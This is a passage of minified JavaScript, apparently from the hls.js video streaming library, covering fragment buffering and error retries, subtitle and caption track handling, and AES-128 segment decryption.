r=this,i=this.fragCurrent,n=t.frag;if(i&&"main"===t.id&&n.sn===i.sn&&n.level===i.level&&("audio"!==t.type||!this.altAudio)&&this.state===L.State.PARSING){var a=this.levels[this.level],s=i;if(e.isFinite(t.endPTS)||(t.endPTS=t.startPTS+i.duration,t.endDTS=t.startDTS+i.duration),!0===t.hasAudio&&s.addElementaryStream(c.default.ElementaryStreamTypes.AUDIO),!0===t.hasVideo&&s.addElementaryStream(c.default.ElementaryStreamTypes.VIDEO),g.logger.log("Parsed "+t.type+",PTS:["+t.startPTS.toFixed(3)+","+t.endPTS.toFixed(3)+"],DTS:["+t.startDTS.toFixed(3)+"/"+t.endDTS.toFixed(3)+"],nb:"+t.nb+",dropped:"+(t.dropped||0)),"video"===t.type)if(s.dropped=t.dropped,s.dropped)if(s.backtracked)g.logger.warn("Already backtracked on this fragment, appending with the gap",s.sn);else{var o=a.details;if(!o||s.sn!==o.startSN)return g.logger.warn("missing video frame(s), backtracking fragment",s.sn),this.fragmentTracker.removeFragment(s),s.backtracked=!0,this.nextLoadPosition=t.startPTS,this.state=L.State.IDLE,this.fragPrevious=s,void this.tick();g.logger.warn("missing video frame(s) on first frag, appending with gap",s.sn)}else s.backtracked=!1;var l=f.updateFragPTSDTS(a.details,s,t.startPTS,t.endPTS,t.startDTS,t.endDTS),d=this.hls;d.trigger(u.default.LEVEL_PTS_UPDATED,{details:a.details,level:this.level,drift:l,type:t.type,start:t.startPTS,end:t.endPTS}),[t.data1,t.data2].forEach(function(e){e&&e.length&&r.state===L.State.PARSING&&(r.appended=!0,r.pendingBuffering=!0,d.trigger(u.default.BUFFER_APPENDING,{type:t.type,data:e,parent:"main",content:"data"}))}),this.tick()}},r.prototype.onFragParsed=function(e){var t=this.fragCurrent,r=e.frag;t&&"main"===e.id&&r.sn===t.sn&&r.level===t.level&&this.state===L.State.PARSING&&(this.stats.tparsed=window.performance.now(),this.state=L.State.PARSED,this._checkAppendedParsed())},r.prototype.onAudioTrackSwitching=function(t){var r=!!t.url,i=t.id;if(!r){if(this.mediaBuffer!==this.media){g.logger.log("switching on main audio, use media.buffered to schedule main fragment loading"),this.mediaBuffer=this.media;var n=this.fragCurrent;n.loader&&(g.logger.log("switching to main audio track, cancel main fragment load"),n.loader.abort()),this.fragCurrent=null,this.fragPrevious=null,this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),this.state=L.State.IDLE}var a=this.hls;a.trigger(u.default.BUFFER_FLUSHING,{startOffset:0,endOffset:e.POSITIVE_INFINITY,type:"audio"}),a.trigger(u.default.AUDIO_TRACK_SWITCHED,{id:i}),this.altAudio=!1}},r.prototype.onAudioTrackSwitched=function(e){var t=e.id,r=!!this.hls.audioTracks[t].url;if(r){var i=this.videoBuffer;i&&this.mediaBuffer!==i&&(g.logger.log("switching on alternate audio, use video.buffered to schedule main fragment loading"),this.mediaBuffer=i)}this.altAudio=r,this.tick()},r.prototype.onBufferCreated=function(e){var t,r,i=e.tracks,n=!1;for(var a in i){var s=i[a];"main"===s.id?(r=a,t=s,"video"===a&&(this.videoBuffer=i[a].buffer)):n=!0}n&&t?(g.logger.log("alternate track found, use "+r+".buffered to schedule main fragment loading"),this.mediaBuffer=t.buffer):this.mediaBuffer=this.media},r.prototype.onBufferAppended=function(e){if("main"===e.parent){var t=this.state;t!==L.State.PARSING&&t!==L.State.PARSED||(this.pendingBuffering=e.pending>0,this._checkAppendedParsed())}},r.prototype._checkAppendedParsed=function(){if(!(this.state!==L.State.PARSED||this.appended&&this.pendingBuffering)){var e=this.fragCurrent;if(e){var t=this.mediaBuffer?this.mediaBuffer:this.media;g.logger.log("main buffered : "+h.default.toString(t.buffered)),this.fragPrevious=e;var r=this.stats;r.tbuffered=window.performance.now(),this.fragLastKbps=Math.round(8*r.total/(r.tbuffered-r.tfirst)),this.hls.trigger(u.default.FRAG_BUFFERED,{stats:r,frag:e,id:"main"}),this.state=L.State.IDLE}this.tick()}},r.prototype.onError=function(t){var r=t.frag||this.fragCurrent;if(!r||"main"===r.type){var i=!!this.media&&s.BufferHelper.isBuffered(this.media,this.media.currentTime)&&s.BufferHelper.isBuffered(this.media,this.media.currentTime+.5);switch(t.details){case p.ErrorDetails.FRAG_LOAD_ERROR:case p.ErrorDetails.FRAG_LOAD_TIMEOUT:case p.ErrorDetails.KEY_LOAD_ERROR:case p.ErrorDetails.KEY_LOAD_TIMEOUT:if(!t.fatal)if(this.fragLoadError+1<=this.config.fragLoadingMaxRetry){var n=Math.min(Math.pow(2,this.fragLoadError)*this.config.fragLoadingRetryDelay,this.config.fragLoadingMaxRetryTimeout);g.logger.warn("mediaController: frag loading failed, retry in "+n+" ms"),this.retryDate=window.performance.now()+n,this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.fragLoadError++,this.state=L.State.FRAG_LOADING_WAITING_RETRY}else g.logger.error("mediaController: "+t.details+" reaches max retry, redispatch as fatal ..."),t.fatal=!0,this.state=L.State.ERROR;break;case p.ErrorDetails.LEVEL_LOAD_ERROR:case p.ErrorDetails.LEVEL_LOAD_TIMEOUT:this.state!==L.State.ERROR&&(t.fatal?(this.state=L.State.ERROR,g.logger.warn("streamController: "+t.details+",switch to "+this.state+" state ...")):t.levelRetry||this.state!==L.State.WAITING_LEVEL||(this.state=L.State.IDLE));break;case p.ErrorDetails.BUFFER_FULL_ERROR:"main"!==t.parent||this.state!==L.State.PARSING&&this.state!==L.State.PARSED||(i?(this._reduceMaxBufferLength(this.config.maxBufferLength),this.state=L.State.IDLE):(g.logger.warn("buffer full error also media.currentTime is not buffered, flush everything"),this.fragCurrent=null,this.flushMainBuffer(0,e.POSITIVE_INFINITY)))}}},r.prototype._reduceMaxBufferLength=function(e){var t=this.config;return t.maxMaxBufferLength>=e&&(t.maxMaxBufferLength/=2,g.logger.warn("main:reduce max buffer length to "+t.maxMaxBufferLength+"s"),!0)},r.prototype._checkBuffer=function(){var e=this.media;if(e&&0!==e.readyState){var t=(this.mediaBuffer?this.mediaBuffer:e).buffered;!this.loadedmetadata&&t.length?(this.loadedmetadata=!0,this._seekToStartPos()):this.immediateSwitch?this.immediateLevelSwitchEnd():this.gapController.poll(this.lastCurrentTime,t)}},r.prototype.onFragLoadEmergencyAborted=function(){this.state=L.State.IDLE,this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.tick()},r.prototype.onBufferFlushed=function(){var e=this.mediaBuffer?this.mediaBuffer:this.media;e&&this.fragmentTracker.detectEvictedFragments(c.default.ElementaryStreamTypes.VIDEO,e.buffered),this.state=L.State.IDLE,this.fragPrevious=null},r.prototype.swapAudioCodec=function(){this.audioCodecSwap=!this.audioCodecSwap},r.prototype.computeLivePosition=function(e,t){var r=void 0!==this.config.liveSyncDuration?this.config.liveSyncDuration:this.config.liveSyncDurationCount*t.targetduration;return e+Math.max(0,t.totalduration-r)},r.prototype._seekToStartPos=function(){var e=this.media,t=e.currentTime,r=e.seeking?t:this.startPosition;t!==r&&(g.logger.log("target start position not buffered, seek to buffered.start(0) "+r+" from current time "+t+" "),e.currentTime=r)},r.prototype._getAudioCodec=function(e){var t=this.config.defaultAudioCodec||e.audioCodec;return this.audioCodecSwap&&(g.logger.log("swapping playlist audio codec"),t&&(t=-1!==t.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5")),t},Object.defineProperty(r.prototype,"liveSyncPosition",{get:function(){return this._liveSyncPosition},set:function(e){this._liveSyncPosition=e},enumerable:!0,configurable:!0}),r}(L.default);t.default=M}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/subtitle-stream-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/utils/logger.js"),o=r("./src/crypt/decrypter.js"),u=r("./src/utils/buffer-helper.js"),l=r("./src/controller/fragment-finders.js"),c=r("./src/controller/fragment-tracker.js"),d=r("./src/controller/base-stream-controller.js"),f=r("./src/controller/level-helper.js"),h=window.performance,p=function(e){function t(t,r){var i=e.call(this,t,a.default.MEDIA_ATTACHED,a.default.MEDIA_DETACHING,a.default.ERROR,a.default.KEY_LOADED,a.default.FRAG_LOADED,a.default.SUBTITLE_TRACKS_UPDATED,a.default.SUBTITLE_TRACK_SWITCH,a.default.SUBTITLE_TRACK_LOADED,a.default.SUBTITLE_FRAG_PROCESSED,a.default.LEVEL_UPDATED)||this;return i.fragmentTracker=r,i.config=t.config,i.state=d.State.STOPPED,i.tracks=[],i.tracksBuffered=[],i.currentTrackId=-1,i.decrypter=new o.default(t,t.config),i.lastAVStart=0,i._onMediaSeeking=i.onMediaSeeking.bind(i),i}return n(t,e),t.prototype.onSubtitleFragProcessed=function(e){var t=e.frag,r=e.success;if(this.fragPrevious=t,this.state=d.State.IDLE,r){var i=this.tracksBuffered[this.currentTrackId];if(i){for(var n,a=t.start,s=0;s<i.length;s++)if(a>=i[s].start&&a<=i[s].end){n=i[s];break}var o=t.start+t.duration;n?n.end=o:(n={start:a,end:o},i.push(n))}}},t.prototype.onMediaAttached=function(e){var t=e.media;this.media=t,t.addEventListener("seeking",this._onMediaSeeking),this.state=d.State.IDLE},t.prototype.onMediaDetaching=function(){this.media.removeEventListener("seeking",this._onMediaSeeking),this.media=null,this.state=d.State.STOPPED},t.prototype.onError=function(e){var t=e.frag;t&&"subtitle"===t.type&&(this.state=d.State.IDLE)},t.prototype.onSubtitleTracksUpdated=function(e){var t=this;s.logger.log("subtitle tracks updated"),this.tracksBuffered=[],this.tracks=e.subtitleTracks,this.tracks.forEach(function(e){t.tracksBuffered[e.id]=[]})},t.prototype.onSubtitleTrackSwitch=function(e){if(this.currentTrackId=e.id,this.tracks&&-1!==this.currentTrackId){var t=this.tracks[this.currentTrackId];t&&t.details&&this.setInterval(500)}else this.clearInterval()},t.prototype.onSubtitleTrackLoaded=function(e){var t=e.id,r=e.details,i=this.currentTrackId,n=this.tracks,a=n[i];t>=n.length||t!==i||!a||(r.live&&f.mergeSubtitlePlaylists(a.details,r,this.lastAVStart),a.details=r,this.setInterval(500))},t.prototype.onKeyLoaded=function(){this.state===d.State.KEY_LOADING&&(this.state=d.State.IDLE)},t.prototype.onFragLoaded=function(e){var t=this.fragCurrent,r=e.frag.decryptdata,i=e.frag,n=this.hls;if(this.state===d.State.FRAG_LOADING&&t&&"subtitle"===e.frag.type&&t.sn===e.frag.sn&&e.payload.byteLength>0&&r&&r.key&&"AES-128"===r.method){var s=h.now();this.decrypter.decrypt(e.payload,r.key.buffer,r.iv.buffer,function(e){var t=h.now();n.trigger(a.default.FRAG_DECRYPTED,{frag:i,payload:e,stats:{tstart:s,tdecrypt:t}})})}},t.prototype.onLevelUpdated=function(e){var t=e.details.fragments;this.lastAVStart=t.length?t[0].start:0},t.prototype.doTick=function(){if(this.media)switch(this.state){case d.State.IDLE:var e=this,t=e.config,r=e.currentTrackId,i=e.fragmentTracker,n=e.media,o=e.tracks;if(!o||!o[r]||!o[r].details)break;var f=t.maxBufferHole,h=t.maxFragLookUpTolerance,p=Math.min(t.maxBufferLength,t.maxMaxBufferLength),g=u.BufferHelper.bufferedInfo(this._getBuffered(),n.currentTime,f),y=g.end,v=g.len,m=o[r].details,L=m.fragments,M=L.length,T=L[M-1].start+L[M-1].duration;if(v>p)return;var A=void 0,w=this.fragPrevious;y<T?(w&&m.hasProgramDateTime&&(A=l.findFragmentByPDT(L,w.endProgramDateTime,h)),A||(A=l.findFragmentByPTS(w,L,y,h))):A=L[M-1],A&&A.encrypted?(s.logger.log("Loading key for "+A.sn),this.state=d.State.KEY_LOADING,this.hls.trigger(a.default.KEY_LOADING,{frag:A})):A&&i.getState(A)===c.FragmentState.NOT_LOADED&&(this.fragCurrent=A,this.state=d.State.FRAG_LOADING,this.hls.trigger(a.default.FRAG_LOADING,{frag:A}))}else this.state=d.State.IDLE},t.prototype.stopLoad=function(){this.lastAVStart=0,e.prototype.stopLoad.call(this)},t.prototype._getBuffered=function(){return this.tracksBuffered[this.currentTrackId]||[]},t.prototype.onMediaSeeking=function(){this.fragPrevious=null},t}(d.default);t.SubtitleStreamController=p},"./src/controller/subtitle-track-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/utils/logger.js"),u=r("./src/controller/level-helper.js"),l=function(t){function r(e){var r=t.call(this,e,a.default.MEDIA_ATTACHED,a.default.MEDIA_DETACHING,a.default.MANIFEST_LOADED,a.default.SUBTITLE_TRACK_LOADED)||this;return r.tracks=[],r.trackId=-1,r.media=null,r.stopped=!0,r.subtitleDisplay=!0,r}return n(r,t),r.prototype.destroy=function(){s.default.prototype.destroy.call(this)},r.prototype.onMediaAttached=function(e){var t=this;this.media=e.media,this.media&&(this.queuedDefaultTrack&&(this.subtitleTrack=this.queuedDefaultTrack,delete this.queuedDefaultTrack),this.trackChangeListener=this._onTextTracksChanged.bind(this),this.useTextTrackPolling=!(this.media.textTracks&&"onchange"in this.media.textTracks),this.useTextTrackPolling?this.subtitlePollingInterval=setInterval(function(){t.trackChangeListener()},500):this.media.textTracks.addEventListener("change",this.trackChangeListener))},r.prototype.onMediaDetaching=function(){this.media&&(this.useTextTrackPolling?clearInterval(this.subtitlePollingInterval):this.media.textTracks.removeEventListener("change",this.trackChangeListener),this.media=null)},r.prototype.onManifestLoaded=function(e){var t=this,r=e.subtitles||[];this.tracks=r,this.hls.trigger(a.default.SUBTITLE_TRACKS_UPDATED,{subtitleTracks:r}),r.forEach(function(e){e.default&&(t.media?t.subtitleTrack=e.id:t.queuedDefaultTrack=e.id)})},r.prototype.onSubtitleTrackLoaded=function(e){var t=this,r=e.id,i=e.details,n=this.trackId,a=this.tracks,s=a[n];if(r>=a.length||r!==n||!s||this.stopped)this._clearReloadTimer();else if(o.logger.log("subtitle track "+r+" loaded"),i.live){var l=u.computeReloadInterval(s.details,i,e.stats.trequest);o.logger.log("Reloading live subtitle playlist in "+l+"ms"),this.timer=setTimeout(function(){t._loadCurrentTrack()},l)}else this._clearReloadTimer()},r.prototype.startLoad=function(){this.stopped=!1,this._loadCurrentTrack()},r.prototype.stopLoad=function(){this.stopped=!0,this._clearReloadTimer()},Object.defineProperty(r.prototype,"subtitleTracks",{get:function(){return this.tracks},enumerable:!0,configurable:!0}),Object.defineProperty(r.prototype,"subtitleTrack",{get:function(){return this.trackId},set:function(e){this.trackId!==e&&(this._toggleTrackModes(e),this._setSubtitleTrackInternal(e))},enumerable:!0,configurable:!0}),r.prototype._clearReloadTimer=function(){this.timer&&(clearTimeout(this.timer),this.timer=null)},r.prototype._loadCurrentTrack=function(){var e=this.trackId,t=this.tracks,r=this.hls,i=t[e];e<0||!i||i.details&&!i.details.live||(o.logger.log("Loading subtitle track "+e),r.trigger(a.default.SUBTITLE_TRACK_LOADING,{url:i.url,id:e}))},r.prototype._toggleTrackModes=function(e){var t=this.media,r=this.subtitleDisplay,i=this.trackId;if(t){var n=c(t.textTracks);if(-1===e)[].slice.call(n).forEach(function(e){e.mode="disabled"});else{var a=n[i];a&&(a.mode="disabled")}var s=n[e];s&&(s.mode=r?"showing":"hidden")}},r.prototype._setSubtitleTrackInternal=function(t){var r=this.hls,i=this.tracks;!e.isFinite(t)||t<-1||t>=i.length||(this.trackId=t,o.logger.log("Switching to subtitle track "+t),r.trigger(a.default.SUBTITLE_TRACK_SWITCH,{id:t}),this._loadCurrentTrack())},r.prototype._onTextTracksChanged=function(){if(this.media){for(var e=-1,t=c(this.media.textTracks),r=0;r<t.length;r++)if("hidden"===t[r].mode)e=r;else if("showing"===t[r].mode){e=r;break}this.subtitleTrack=e}},r}(s.default);function c(e){for(var t=[],r=0;r<e.length;r++){var i=e[r];"subtitles"===i.kind&&i.label&&t.push(e[r])}return t}t.default=l}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/timeline-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/utils/cea-608-parser.js"),u=r("./src/utils/output-filter.js"),l=r("./src/utils/webvtt-parser.js"),c=r("./src/utils/logger.js"),d=r("./src/utils/texttrack-utils.js");function f(e,t){return e&&e.label===t.name&&!(e.textTrack1||e.textTrack2)}var h=function(t){function r(e){var r=t.call(this,e,a.default.MEDIA_ATTACHING,a.default.MEDIA_DETACHING,a.default.FRAG_PARSING_USERDATA,a.default.FRAG_DECRYPTED,a.default.MANIFEST_LOADING,a.default.MANIFEST_LOADED,a.default.FRAG_LOADED,a.default.LEVEL_SWITCHING,a.default.INIT_PTS_FOUND)||this;if(r.hls=e,r.config=e.config,r.enabled=!0,r.Cues=e.config.cueHandler,r.textTracks=[],r.tracks=[],r.unparsedVttFrags=[],r.initPTS=[],r.cueRanges=[],r.captionsTracks={},r.captionsProperties={textTrack1:{label:r.config.captionsTextTrack1Label,languageCode:r.config.captionsTextTrack1LanguageCode},textTrack2:{label:r.config.captionsTextTrack2Label,languageCode:r.config.captionsTextTrack2LanguageCode}},r.config.enableCEA708Captions){var i=new u.default(r,"textTrack1"),n=new u.default(r,"textTrack2");r.cea608Parser=new o.default(0,i,n)}return r}return n(r,t),r.prototype.addCues=function(e,t,r,i){for(var n,a,s,o,u=this.cueRanges,l=!1,c=u.length;c--;){var d=u[c],f=(n=d[0],a=d[1],s=t,o=r,Math.min(a,o)-Math.max(n,s));if(f>=0&&(d[0]=Math.min(d[0],t),d[1]=Math.max(d[1],r),l=!0,f/(r-t)>.5))return}l||u.push([t,r]),this.Cues.newCue(this.captionsTracks[e],t,r,i)},r.prototype.onInitPtsFound=function(e){var t=this;if("main"===e.id&&(this.initPTS[e.frag.cc]=e.initPTS),this.unparsedVttFrags.length){var r=this.unparsedVttFrags;this.unparsedVttFrags=[],r.forEach(function(e){t.onFragLoaded(e)})}},r.prototype.getExistingTrack=function(e){var t=this.media;if(t)for(var r=0;r<t.textTracks.length;r++){var i=t.textTracks[r];if(i[e])return i}return null},r.prototype.createCaptionsTrack=function(e){var t=this.captionsProperties[e],r=t.label,i=t.languageCode,n=this.captionsTracks;if(!n[e]){var a=this.getExistingTrack(e);if(a)n[e]=a,d.clearCurrentCues(n[e]),d.sendAddTrackEvent(n[e],this.media);else{var s=this.createTextTrack("captions",r,i);s&&(s[e]=!0,n[e]=s)}}},r.prototype.createTextTrack=function(e,t,r){var i=this.media;if(i)return i.addTextTrack(e,t,r)},r.prototype.destroy=function(){s.default.prototype.destroy.call(this)},r.prototype.onMediaAttaching=function(e){this.media=e.media,this._cleanTracks()},r.prototype.onMediaDetaching=function(){var e=this.captionsTracks;Object.keys(e).forEach(function(t){d.clearCurrentCues(e[t]),delete e[t]})},r.prototype.onManifestLoading=function(){this.lastSn=-1,this.prevCC=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!1}},this._cleanTracks()},r.prototype._cleanTracks=function(){var e=this.media;if(e){var t=e.textTracks;if(t)for(var r=0;r<t.length;r++)d.clearCurrentCues(t[r])}},r.prototype.onManifestLoaded=function(e){var t=this;if(this.textTracks=[],this.unparsedVttFrags=this.unparsedVttFrags||[],this.initPTS=[],this.cueRanges=[],this.config.enableWebVTT){this.tracks=e.subtitles||[];var r=this.media?this.media.textTracks:[];this.tracks.forEach(function(e,i){var n;if(i<r.length){for(var a=null,s=0;s<r.length;s++)if(f(r[s],e)){a=r[s];break}a&&(n=a)}n||(n=t.createTextTrack("subtitles",e.name,e.lang)),e.default?n.mode=t.hls.subtitleDisplay?"showing":"hidden":n.mode="disabled",t.textTracks.push(n)})}},r.prototype.onLevelSwitching=function(){this.enabled="NONE"!==this.hls.currentLevel.closedCaptions},r.prototype.onFragLoaded=function(t){var r=t.frag,i=t.payload;if("main"===r.type){var n=r.sn;if(n!==this.lastSn+1){var s=this.cea608Parser;s&&s.reset()}this.lastSn=n}else if("subtitle"===r.type)if(i.byteLength){if(!e.isFinite(this.initPTS[r.cc]))return this.unparsedVttFrags.push(t),void(this.initPTS.length&&this.hls.trigger(a.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r}));var o=r.decryptdata;null!=o&&null!=o.key&&"AES-128"===o.method||this._parseVTTs(r,i)}else this.hls.trigger(a.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r})},r.prototype._parseVTTs=function(e,t){var r=this.vttCCs;r[e.cc]||(r[e.cc]={start:e.start,prevCC:this.prevCC,new:!0},this.prevCC=e.cc);var i=this.textTracks,n=this.hls;l.default.parse(t,this.initPTS[e.cc],r,e.cc,function(t){var r=i[e.level];"disabled"!==r.mode?(t.forEach(function(e){if(!r.cues.getCueById(e.id))try{r.addCue(e)}catch(i){var t=new window.TextTrackCue(e.startTime,e.endTime,e.text);t.id=e.id,r.addCue(t)}}),n.trigger(a.default.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:e})):n.trigger(a.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:e})},function(t){c.logger.log("Failed to parse VTT cue: "+t),n.trigger(a.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:e})})},r.prototype.onFragDecrypted=function(t){var r=t.payload,i=t.frag;if("subtitle"===i.type){if(!e.isFinite(this.initPTS[i.cc]))return void this.unparsedVttFrags.push(t);this._parseVTTs(i,r)}},r.prototype.onFragParsingUserdata=function(e){if(this.enabled&&this.config.enableCEA708Captions)for(var t=0;t<e.samples.length;t++){var r=this.extractCea608Data(e.samples[t].bytes);this.cea608Parser.addData(e.samples[t].pts,r)}},r.prototype.extractCea608Data=function(e){for(var t,r,i,n=31&e[0],a=2,s=[],o=0;o<n;o++)t=e[a++],r=127&e[a++],i=127&e[a++],0===r&&0===i||0!=(4&t)&&0===(3&t)&&(s.push(r),s.push(i));return s},r}(s.default);t.default=h}).call(this,r("./src/polyfills/number.js").Number)},"./src/crypt/aes-crypto.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){this.subtle=e,this.aesIV=t}return e.prototype.decrypt=function(e,t){return this.subtle.decrypt({name:"AES-CBC",iv:this.aesIV},t,e)},e}();t.default=i},"./src/crypt/aes-decryptor.js":function(e,t,r){"use strict";function i(e){var t=e.byteLength,r=t&&new DataView(e).getUint8(t-1);return r?e.slice(0,t-r):e}Object.defineProperty(t,"__esModule",{value:!0}),t.removePadding=i;var n=function(){function e(){this.rcon=[0,1,2,4,8,16,32,64,128,27,54],this.subMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.invSubMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.sBox=new Uint32Array(256),this.invSBox=new Uint32Array(256),this.key=new Uint32Array(0),this.initTable()}return e.prototype.uint8ArrayToUint32Array_=function(e){for(var t=new DataView(e),r=new Uint32Array(4),i=0;i<4;i++)r[i]=t.getUint32(4*i);return r},e.prototype.initTable=function(){var e=this.sBox,t=this.invSBox,r=this.subMix,i=r[0],n=r[1],a=r[2],s=r[3],o=this.invSubMix,u=o[0],l=o[1],c=o[2],d=o[3],f=new Uint32Array(256),h=0,p=0,g=0;for(g=0;g<256;g++)f[g]=g<128?g<<1:g<<1^283;for(g=0;g<256;g++){var y=p^p<<1^p<<2^p<<3^p<<4;y=y>>>8^255&y^99,e[h]=y,t[y]=h;var v=f[h],m=f[v],L=f[m],M=257*f[y]^16843008*y;i[h]=M<<24|M>>>8,n[h]=M<<16|M>>>16,a[h]=M<<8|M>>>24,s[h]=M,M=16843009*L^65537*m^257*v^16843008*h,u[y]=M<<24|M>>>8,l[y]=M<<16|M>>>16,c[y]=M<<8|M>>>24,d[y]=M,h?(h=v^f[f[f[L^v]]],p^=f[f[p]]):h=p=1}},e.prototype.expandKey=function(e){for(var t=this.uint8ArrayToUint32Array_(e),r=!0,i=0;i<t.length&&r;)r=t[i]===this.key[i],i++;if(!r){this.key=t;var n=this.keySize=t.length;if(4!==n&&6!==n&&8!==n)throw new Error("Invalid aes key size="+n);var a,s,o,u,l=this.ksRows=4*(n+6+1),c=this.keySchedule=new Uint32Array(l),d=this.invKeySchedule=new Uint32Array(l),f=this.sBox,h=this.rcon,p=this.invSubMix,g=p[0],y=p[1],v=p[2],m=p[3];for(a=0;a<l;a++)a<n?o=c[a]=t[a]:(u=o,a%n==0?(u=f[(u=u<<8|u>>>24)>>>24]<<24|f[u>>>16&255]<<16|f[u>>>8&255]<<8|f[255&u],u^=h[a/n|0]<<24):n>6&&a%n==4&&(u=f[u>>>24]<<24|f[u>>>16&255]<<16|f[u>>>8&255]<<8|f[255&u]),c[a]=o=(c[a-n]^u)>>>0);for(s=0;s<l;s++)a=l-s,u=3&s?c[a]:c[a-4],d[s]=s<4||a<=4?u:g[f[u>>>24]]^y[f[u>>>16&255]]^v[f[u>>>8&255]]^m[f[255&u]],d[s]=d[s]>>>0}},e.prototype.networkToHostOrderSwap=function(e){return e<<24|(65280&e)<<8|(16711680&e)>>8|e>>>24},e.prototype.decrypt=function(e,t,r,n){for(var a,s,o,u,l,c,d,f,h,p,g,y,v,m,L=this.keySize+6,M=this.invKeySchedule,T=this.invSBox,A=this.invSubMix,w=A[0],E=A[1],S=A[2],D=A[3],b=this.uint8ArrayToUint32Array_(r),j=b[0],C=b[1],I=b[2],x=b[3],N=new Int32Array(e),_=new Int32Array(N.length),O=this.networkToHostOrderSwap;t<N.length;){for(h=O(N[t]),p=O(N[t+1]),g=O(N[t+2]),y=O(N[t+3]),l=h^M[0],c=y^M[1],d=g^M[2],f=p^M[3],v=4,m=1;m<L;m++)a=w[l>>>24]^E[c>>16&255]^S[d>>8&255]^D[255&f]^M[v],s=w[c>>>24]^E[d>>16&255]^S[f>>8&255]^D[255&l]^M[v+1],o=w[d>>>24]^E[f>>16&255]^S[l>>8&255]^D[255&c]^M[v+2],u=w[f>>>24]^E[l>>16&255]^S[c>>8&255]^D[255&d]^M[v+3],l=a,c=s,d=o,f=u,v+=4;a=T[l>>>24]<<24^T[c>>16&255]<<16^T[d>>8&255]<<8^T[255&f]^M[v],s=T[c>>>24]<<24^T[d>>16&255]<<16^T[f>>8&255]<<8^T[255&l]^M[v+1],o=T[d>>>24]<<24^T[f>>16&255]<<16^T[l>>8&255]<<8^T[255&c]^M[v+2],u=T[f>>>24]<<24^T[l>>16&255]<<16^T[c>>8&255]<<8^T[255&d]^M[v+3],v+=3,_[t]=O(a^j),_[t+1]=O(u^C),_[t+2]=O(o^I),_[t+3]=O(s^x),j=h,C=p,I=g,x=y,t+=4}return n?i(_.buffer):_.buffer},e.prototype.destroy=function(){this.key=void 0,this.keySize=void 0,this.ksRows=void 0,this.sBox=void 0,this.invSBox=void 0,this.subMix=void 0,this.invSubMix=void 0,this.keySchedule=void 0,this.invKeySchedule=void 0,this.rcon=void 0},e}();t.default=n},"./src/crypt/decrypter.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/crypt/aes-crypto.js"),n=r("./src/crypt/fast-aes-key.js"),a=r("./src/crypt/aes-decryptor.js"),s=r("./src/errors.js"),o=r("./src/utils/logger.js"),u=r("./src/events.js"),l=r("./src/utils/get-self-scope.js").getSelfScope(),c=function(){function e(e,t,r){var i=(void 0===r?{}:r).removePKCS7Padding,n=void 0===i||i;if(this.logEnabled=!0,this.observer=e,this.config=t,this.removePKCS7Padding=n,n)try{var a=l.crypto;a&&(this.subtle=a.subtle||a.webkitSubtle)}catch(e){}this.disableWebCrypto=!this.subtle}return e.prototype.isSync=function(){return this.disableWebCrypto&&this.config.enableSoftwareAES},e.prototype.decrypt=function(e,t,r,s){var u=this;if(this.disableWebCrypto&&this.config.enableSoftwareAES){this.logEnabled&&(o.logger.log("JS AES decrypt"),this.logEnabled=!1);var l=this.decryptor;l||(this.decryptor=l=new a.default),l.expandKey(t),s(l.decrypt(e,0,r,this.removePKCS7Padding))}else{this.logEnabled&&(o.logger.log("WebCrypto AES decrypt"),this.logEnabled=!1);var c=this.subtle;this.key!==t&&(this.key=t,this.fastAesKey=new n.default(c,t)),this.fastAesKey.expandKey().then(function(n){new i.default(c,r).decrypt(e,n).catch(function(i){u.onWebCryptoError(i,e,t,r,s)}).then(function(e){s(e)})}).catch(function(i){u.onWebCryptoError(i,e,t,r,s)})}},e.prototype.onWebCryptoError=function(e,t,r,i,n){this.config.enableSoftwareAES?(o.logger.log("WebCrypto Error, disable WebCrypto API"),this.disableWebCrypto=!0,this.logEnabled=!0,this.decrypt(t,r,i,n)):(o.logger.error("decrypting error : "+e.message),this.observer.trigger(u.default.ERROR,{type:s.ErrorTypes.MEDIA_ERROR,details:s.ErrorDetails.FRAG_DECRYPT_ERROR,fatal:!0,reason:e.message}))},e.prototype.destroy=function(){var 